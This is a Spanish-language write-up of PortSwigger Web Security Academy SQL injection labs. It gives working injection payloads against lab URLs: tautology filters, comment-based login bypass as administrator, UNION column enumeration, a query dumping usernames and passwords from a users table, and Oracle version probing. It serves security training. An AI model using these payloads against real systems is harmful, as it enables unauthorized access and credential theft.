# SQL injection

## Índice
* [Retrieving hidden data](retrieving-hidden-data)
* [Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](lab1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
* [Subverting application logic](lab1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
* [Lab2: SQL injection vulnerability allowing login bypass](lab2-sql-injection-vulnerability-allowing-login-bypass)
* [UNION attacks]
* [Examining the database]
* [Blind SQL injection]

## Retrieving hidden data

### Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

![sql1.png](sql1.png)

```http
https://ac701fd11eeda548806db59400ab002f.web-security-academy.net/filter?category=Gifts' or 1 = 1 --
```

## Subverting application logic

### Lab2: SQL injection vulnerability allowing login bypass

![sql2.png](sql2.png)

#### 1 forma

username: `administrator' --`

password: `cualquier cosa por que este será interpretado como comentario pero requiere de algun texto para poder ser validado`

#### Otra forma sería:

username: `administrator' or 1 = 1 --` 

password: `'or 1 = 1 --`

## Retrieving data from other database tables(Union attacks)

### Lab3: SQL injection UNION attack, determining the number of columns returned by the query
![sql3.png](sql3.png)

```http
https://ac961fdd1e31962380aa27ed00e300af.web-security-academy.net/filter?category=Accessories' union select null,null,null --
```

### Lab4: SQL injection UNION attack, finding a column containing text

Lo primero es encontrar la cantidad de columnas que tiene la tabla

![sql4.1.png](sql4.1.png)

```http
https://accb1fe71f4b818780eb38b000d600be.web-security-academy.net/filter?category=Accessories' union select null,null ,null --
```

ahora es identificar cual columna permite caracteres

![sql4.2.png](sql4.2.png)

```http
https://ac851f641e0191b48054265b00af0007.web-security-academy.net/filter?category=Accessories' union select null,'p2Omtj',null --
```

### Lab5: SQL injection UNION attack, retrieving data from other tables

Primero igual que los anteriores problemas buscamos la cantidad de columnas

```http
https://acf71f531efe798180e3028300c30029.web-security-academy.net/filter?category=Food+&+Drink' union select null,null --
```

luego buscamos cuales se pueden utilizar caracteres

```http
https://acf71f531efe798180e3028300c30029.web-security-academy.net/filter?category=' union select 'a','a' --
```

ahora si buscamos los usarios y las contraseñas

```http
https://acf71f531efe798180e3028300c30029.web-security-academy.net/filter?category=' union select username, password from users --
```

### Lab6: SQL injection attack, querying the database type and version on Oracle

De nuevo es averiguar el numero de columnas incialmente, pero en este caso el truco es intentar con el uso de una tabla dual que esta por defecto en la base de datos de oracle

```http
https://acee1f761fa9a991805415580007004d.web-security-academy.net/filter?category=Corporate+gifts' union select null,null from dual --
```

ahora para sacar la version de un servidor de Oracle debemos adaptar la consulta `SELECT banner FROM v$version`